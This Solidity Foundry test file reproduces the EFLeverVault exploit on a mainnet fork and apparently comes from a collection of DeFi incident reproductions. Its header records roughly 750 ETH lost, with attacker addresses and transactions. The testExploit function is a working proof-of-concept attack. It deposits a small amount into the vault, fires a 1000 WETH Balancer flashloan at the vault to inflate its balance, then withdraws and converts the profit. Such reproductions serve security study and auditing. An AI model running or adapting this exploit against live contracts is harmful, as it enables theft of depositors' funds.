// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~750 ETH
// Attacker : 0xdf31F4C8dC9548eb4c416Af26dC396A25FDE4D5F
// Attack Contracts :
//  - https://etherscan.io/address/0x140cca423081ed0366765f18fc9f5ed299699388
//  - https://etherscan.io/address/0x8663fbfc41a0bac88e7cd4b128b7a77381e77781
// Vulnerable Contract : https://etherscan.io/address/0xe39fd820b58f83205db1d9225f28105971c3d309
// Attack Txs :
//   - https://etherscan.io/tx/0x1f1aba5bef04b7026ae3cb1cb77987071a8aff9592e785dd99860566ccad83d1 frontrun bot
//   - https://etherscan.io/tx/0x160c5950a01b88953648ba90ec0a29b0c5383e055d35a7835d905c53a3dda01e exploiter

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xe39fd820b58f83205db1d9225f28105971c3d309#code#L324

// @Analysis
// Twitter Supremacy : https://twitter.com/Supremacy_CA/status/1581012823701786624
// Twitter MevRefund : https://twitter.com/MevRefund/status/1580917351217627136
// Twitter Daniel Von Fange : https://twitter.com/danielvf/status/1580936010556661761

interface IEFLeverVault {
    function deposit(uint256) external payable;
    function withdraw(uint256) external;
}

contract ContractTest is Test {
    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IEFLeverVault constant EFLEVER_VAULT = IEFLeverVault(0xe39fd820B58f83205Db1D9225f28105971c3D309);
    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_746_199);
        // Adding labels to improve stack traces' readability
        vm.label(address(WETH_TOKEN), "WETH_TOKEN");
        vm.label(address(EFLEVER_VAULT), "EFLEVER_VAULT");
        vm.label(address(BALANCER_VAULT), "BALANCER_VAULT");
        vm.label(0xBAe7EC1BAaAe7d5801ad41691A2175Aa11bcba19, "EF_LEVER_TOKEN");
        vm.label(0x071108Ad85d7a766B41E0f5e5195537A8FC8E74D, "EF_LEVER_UNVERIFIED_SAFEMATH");
        vm.label(0x030bA81f1c18d280636F32af80b9AAd02Cf0854e, "aWETH_TOKEN");
        vm.label(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, "stETH_TOKEN");
        vm.label(0x1982b2F5814301d4e9a8b0201555376e62F82428, "aSTETH_TOKEN");
        vm.label(0xF63B34710400CAd3e044cFfDcAb00a0f32E33eCf, "variableDebtWETH_TOKEN");
        vm.label(0xA50ba011c48153De246E5192C8f9258A2ba79Ca9, "AAVE_ORACLE");
        vm.label(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9, "AAVE_LENDING_POOL_V2");
        vm.label(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, "CURVE_stETH_POOL");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker WETH balance before exploit", WETH_TOKEN.balanceOf(address(this)), 18
        );
        uint256 ethBalanceBefore = address(this).balance;

        // Deposit 0.1 ETH into the EFLever Vault
        EFLEVER_VAULT.deposit{value: 1e17}(1e17);

        emit log_named_decimal_uint(
            "\n\tBefore flashloan, ETH balance in EFLeverVault", address(EFLEVER_VAULT).balance, 18
        );
        // Flashloan to manipulate contract's balance
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH_TOKEN);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000 * 1e18;
        bytes memory userData = "0x2";
        BALANCER_VAULT.flashLoan(address(EFLEVER_VAULT), tokens, amounts, userData);
        emit log_named_decimal_uint(
            "\tAfter flashloan, ETH balance in EFLeverVault", address(EFLEVER_VAULT).balance, 18
        );
        EFLEVER_VAULT.withdraw(9e16);
        emit log_named_decimal_uint("\tAfter withdraw, ETH balance in EFLeverVault", address(EFLEVER_VAULT).balance, 18);

        // Swap the profit in ETH to WETH
        uint256 ethProfit = address(this).balance - ethBalanceBefore;
        WETH_TOKEN.deposit{value: ethProfit}();

        emit log_named_decimal_uint(
            "\n[End] Attacker WETH balance after exploit", WETH_TOKEN.balanceOf(address(this)), 18
        );
    }

    receive() external payable {}
}
